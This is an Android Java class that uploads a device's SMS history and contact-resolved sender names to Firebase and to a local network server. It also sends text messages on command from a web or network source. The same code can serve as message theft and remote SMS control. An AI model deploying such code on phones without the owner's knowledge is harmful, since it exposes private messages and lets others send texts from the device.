package com.dialingassistant.agent;

import android.Manifest;
import android.database.ContentObserver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.Looper;
import android.provider.ContactsContract;
import android.util.Log;

import androidx.core.app.ActivityCompat;

import com.google.firebase.database.DataSnapshot;

import java.util.Collections;
import java.util.HashMap;
import java.util.HashSet;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.Set;

/**
 * Handles full SMS history sync to Firebase RTDB and listens for web-originated
 * send commands (sms_send_cmd) to deliver outgoing SMS from the device.
 *
 * Schema written:
 *   agents/{uid}/sms_messages/{msgId}   – individual messages (last 300 total)
 *   agents/{uid}/sms_threads/{threadId} – per-thread metadata
 *   agents/{uid}/state/sms_send_cmd     – send command node (web → android)
 *
 * Send-spam prevention:
 *   The RTDB ValueEventListener fires on every write to sms_send_cmd (including
 *   our own status updates).  We gate on both the persisted "status" field AND
 *   an in-memory processedCmdIds set so a cmdId is never sent twice regardless
 *   of how many times the listener fires.
 *
 * Incremental sync:
 *   After the initial full sync, lastSyncTimestamp is updated.  Subsequent
 *   ContentObserver-triggered syncs only query messages newer than that timestamp,
 *   avoiding re-writing hundreds of unchanged records to Firebase on every event.
 */
public class SmsSyncManager {

    private static final String TAG = "SmsSyncManager";
    private static final int MAX_MESSAGES = 300;

    private final Context context;
    private final FirestoreManager firestoreManager;
    private final Handler debounceHandler = new Handler(Looper.getMainLooper());
    private ContentObserver smsObserver;
    private Runnable pendingSyncRunnable;
    private ListenerRegistration smsSendCmdListener;
    private ListenerRegistration smsSyncReqListener;

    // Tracks cmdIds that have already been dispatched this session
    private final Set<String> processedCmdIds =
            Collections.synchronizedSet(new HashSet<>());

    // Timestamp of the last completed sync; 0 = initial (full) sync required
    private volatile long lastSyncTimestamp = 0L;

    public SmsSyncManager(Context context, FirestoreManager firestoreManager) {
        this.context = context.getApplicationContext();
        this.firestoreManager = firestoreManager;
    }

    // ── Lifecycle ─────────────────────────────────────────────────────────────

    public void register() {
        if (!hasReadPermission()) {
            Log.w(TAG, "READ_SMS not granted — SMS sync disabled");
            return;
        }
        registerSmsContentObserver();
        registerSendCommandListener();
        registerSyncRequestListener();
        new Thread(this::syncAllSms, "SmsSyncThread-init").start();
    }

    public void unregister() {
        try { context.getContentResolver().unregisterContentObserver(smsObserver); } catch (Exception ignored) {}
        if (smsSendCmdListener != null) { smsSendCmdListener.remove(); smsSendCmdListener = null; }
        if (smsSyncReqListener != null) { smsSyncReqListener.remove(); smsSyncReqListener = null; }
        debounceHandler.removeCallbacksAndMessages(null);
    }

    // ── Content observer ──────────────────────────────────────────────────────

    private void registerSmsContentObserver() {
        smsObserver = new ContentObserver(new Handler(Looper.getMainLooper())) {
            @Override
            public void onChange(boolean selfChange, Uri uri) {
                final Runnable prev = pendingSyncRunnable;
                if (prev != null) debounceHandler.removeCallbacks(prev);
                final Runnable next = () ->
                        new Thread(SmsSyncManager.this::syncAllSms, "SmsSyncThread-obs").start();
                pendingSyncRunnable = next;
                debounceHandler.postDelayed(next, 2000); // 2 s debounce
            }
        };
        context.getContentResolver().registerContentObserver(
                Uri.parse("content://sms"), true, smsObserver);
        Log.d(TAG, "SMS ContentObserver registered");
    }

    // ── Sync (full on first call, incremental afterwards) ─────────────────────

    private void syncAllSms() {
        if (!hasReadPermission()) return;

        long syncFrom = lastSyncTimestamp;   // 0 on first run → full sync
        long syncTo   = System.currentTimeMillis();

        String selection     = (syncFrom > 0) ? "date > ?" : null;
        String[] selectionArgs = (syncFrom > 0) ? new String[]{ String.valueOf(syncFrom) } : null;

        // Limit full syncs to MAX_MESSAGES; incremental syncs are unbounded (usually tiny)
        Cursor cursor = context.getContentResolver().query(
                Uri.parse("content://sms"),
                new String[]{"_id", "thread_id", "address", "body", "date", "type", "read"},
                selection, selectionArgs,
                "date DESC"
        );

        if (cursor == null) {
            Log.e(TAG, "SMS cursor null — skipping sync");
            return;
        }

        Map<String, Map<String, Object>> threadMap = new LinkedHashMap<>();
        int count = 0;

        try {
            while (cursor.moveToNext()) {
                if (syncFrom == 0 && count >= MAX_MESSAGES) break; // cap full sync

                String id       = safeString(cursor, "_id");
                String threadId = safeString(cursor, "thread_id");
                String address  = safeString(cursor, "address");
                String body     = safeString(cursor, "body");
                long   date     = safeLong  (cursor, "date");
                int    type     = safeInt   (cursor, "type");
                int    read     = safeInt   (cursor, "read");

                if (address.isEmpty() || id.isEmpty()) continue;

                // Always use the sanitized sender address as the thread key so it
                // matches the key written by SmsReceiver (which has no access to
                // Android's numeric thread_id at broadcast time).
                String threadKey = sanitizeKey(address);
                String msgKey    = id + "_" + threadKey;
                String direction = (type == 2) ? "outgoing" : "incoming";
                String display   = coalesce(resolveContactName(address), address);

                Map<String, Object> msgData = new HashMap<>();
                msgData.put("id",          msgKey);
                msgData.put("threadId",    threadKey);
                msgData.put("address",     address);
                msgData.put("displayName", display);
                msgData.put("body",        body);
                msgData.put("timestamp",   date);
                msgData.put("direction",   direction);
                msgData.put("status",      type == 2 ? "sent" : "received");
                msgData.put("read",        read == 1);
                firestoreManager.writeSmsMessage(msgKey, msgData);
                LocalNetworkServer.broadcast("sms_message", msgData);

                if (!threadMap.containsKey(threadKey)) {
                    Map<String, Object> threadData = new HashMap<>();
                    threadData.put("id",            threadKey);
                    threadData.put("address",       address);
                    threadData.put("displayName",   display);
                    threadData.put("lastMessage",   body);
                    threadData.put("lastTimestamp", date);
                    threadData.put("direction",     direction);
                    threadMap.put(threadKey, threadData);
                }
                count++;
            }
        } finally {
            cursor.close();
        }

        for (Map.Entry<String, Map<String, Object>> e : threadMap.entrySet()) {
            firestoreManager.updateSmsThread(e.getKey(), e.getValue());
            LocalNetworkServer.broadcast("sms_thread", e.getValue());
        }

        lastSyncTimestamp = syncTo;
        Log.d(TAG, (syncFrom == 0 ? "Full" : "Incremental") +
                " SMS sync done: " + count + " msg, " + threadMap.size() + " threads");
    }

    // ── Send command listener ─────────────────────────────────────────────────

    // ── Sync-request listener (web → android manual sync) ────────────────────

    private void registerSyncRequestListener() {
        smsSyncReqListener = firestoreManager.listenToSmsSyncRequest((snapshot, error) -> {
            if (error != null || snapshot == null || !snapshot.exists()) return;
            Object val = snapshot.getValue();
            if (Boolean.TRUE.equals(val) || "true".equals(String.valueOf(val))) {
                Log.d(TAG, "Manual sync requested from web");
                firestoreManager.clearSmsSyncRequest();
                lastSyncTimestamp = 0L; // force full re-sync
                new Thread(SmsSyncManager.this::syncAllSms, "SmsSyncThread-req").start();
            }
        });
    }

    /**
     * Handle an SMS send command arriving via the local network server instead
     * of Firebase. Uses the same deduplication logic as the Firebase path.
     */
    public void handleLocalSendCmd(String to, String body, String cmdId) {
        if (to.isEmpty() || body.isEmpty() || cmdId.isEmpty()) return;
        if (processedCmdIds.contains(cmdId)) return;
        processedCmdIds.add(cmdId);
        firestoreManager.updateSmsSendCmdStatus(cmdId, "sending");
        sendSms(to, body, cmdId);
    }

    // ── Send command listener ─────────────────────────────────────────────────

    private void registerSendCommandListener() {
        smsSendCmdListener = firestoreManager.listenToSmsSendCmd((snapshot, error) -> {
            if (error != null || snapshot == null || !snapshot.exists()) return;

            String to    = asString(snapshot.child("to").getValue());
            String body  = asString(snapshot.child("body").getValue());
            String cmdId = asString(snapshot.child("cmdId").getValue());

            if (to.isEmpty() || body.isEmpty() || cmdId.isEmpty()) return;

            // ── Double-gate: persisted status + in-memory set ────────────────
            // The persisted status catches restarts; the in-memory set catches
            // duplicate listener firings within the same service session.
            String status = asString(snapshot.child("status").getValue());
            if ("sent".equals(status) || "failed".equals(status) || "sending".equals(status)) return;
            if (processedCmdIds.contains(cmdId)) return;

            processedCmdIds.add(cmdId);
            firestoreManager.updateSmsSendCmdStatus(cmdId, "sending");
            sendSms(to, body, cmdId);
        });
    }

    private void sendSms(String to, String body, String cmdId) {
        if (!hasSendPermission()) {
            Log.e(TAG, "SEND_SMS not granted");
            processedCmdIds.remove(cmdId);
            firestoreManager.updateSmsSendCmdStatus(cmdId, "failed");
            return;
        }
        try {
            android.telephony.SmsManager mgr = android.telephony.SmsManager.getDefault();
            if (body.length() > 160) {
                mgr.sendMultipartTextMessage(to, null, mgr.divideMessage(body), null, null);
            } else {
                mgr.sendTextMessage(to, null, body, null, null);
            }

            long now      = System.currentTimeMillis();
            String msgId  = now + "_out_" + Math.abs(to.hashCode());
            String threadKey = sanitizeKey(to);
            String display   = coalesce(resolveContactName(to), to);

            Map<String, Object> msgData = new HashMap<>();
            msgData.put("id",          msgId);
            msgData.put("threadId",    threadKey);
            msgData.put("address",     to);
            msgData.put("displayName", display);
            msgData.put("body",        body);
            msgData.put("timestamp",   now);
            msgData.put("direction",   "outgoing");
            msgData.put("status",      "sent");
            msgData.put("read",        true);
            firestoreManager.writeSmsMessage(msgId, msgData);
            LocalNetworkServer.broadcast("sms_message", msgData);

            Map<String, Object> threadData = new HashMap<>();
            threadData.put("id",            threadKey);
            threadData.put("address",       to);
            threadData.put("displayName",   display);
            threadData.put("lastMessage",   body);
            threadData.put("lastTimestamp", now);
            threadData.put("direction",     "outgoing");
            firestoreManager.updateSmsThread(threadKey, threadData);
            LocalNetworkServer.broadcast("sms_thread", threadData);

            firestoreManager.updateSmsSendCmdStatus(cmdId, "sent");
            Log.d(TAG, "SMS sent to " + to + " [cmdId=" + cmdId + "]");
        } catch (Exception e) {
            Log.e(TAG, "sendSms failed: " + e.getMessage(), e);
            processedCmdIds.remove(cmdId); // allow retry on next send attempt
            firestoreManager.updateSmsSendCmdStatus(cmdId, "failed");
        }
    }

    // ── Contact resolution ────────────────────────────────────────────────────

    private String resolveContactName(String phoneNumber) {
        if (phoneNumber == null || phoneNumber.isEmpty()) return null;
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS)
                != PackageManager.PERMISSION_GRANTED) return null;
        Uri uri = Uri.withAppendedPath(
                ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(phoneNumber));
        try (Cursor c = context.getContentResolver().query(
                uri, new String[]{ContactsContract.PhoneLookup.DISPLAY_NAME}, null, null, null)) {
            if (c != null && c.moveToFirst()) {
                int idx = c.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME);
                return (idx >= 0) ? c.getString(idx) : null;
            }
        } catch (Exception ignored) {}
        return null;
    }

    // ── Helpers ───────────────────────────────────────────────────────────────

    private boolean hasReadPermission() {
        return ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_SMS)
                == PackageManager.PERMISSION_GRANTED;
    }

    private boolean hasSendPermission() {
        return ActivityCompat.checkSelfPermission(context, Manifest.permission.SEND_SMS)
                == PackageManager.PERMISSION_GRANTED;
    }

    private String sanitizeKey(String key) {
        if (key == null || key.isEmpty()) return "unknown";
        return key.replaceAll("[.#$\\[\\]/+\\s]", "_");
    }

    private String coalesce(String a, String b) { return (a != null && !a.isEmpty()) ? a : b; }

    private String safeString(Cursor c, String col) {
        int i = c.getColumnIndex(col);
        if (i < 0) return "";
        String v = c.getString(i);
        return v != null ? v : "";
    }

    private long safeLong(Cursor c, String col) {
        int i = c.getColumnIndex(col);
        return i >= 0 ? c.getLong(i) : 0L;
    }

    private int safeInt(Cursor c, String col) {
        int i = c.getColumnIndex(col);
        return i >= 0 ? c.getInt(i) : 0;
    }

    private String asString(Object v) {
        return v != null ? v.toString() : "";
    }
}
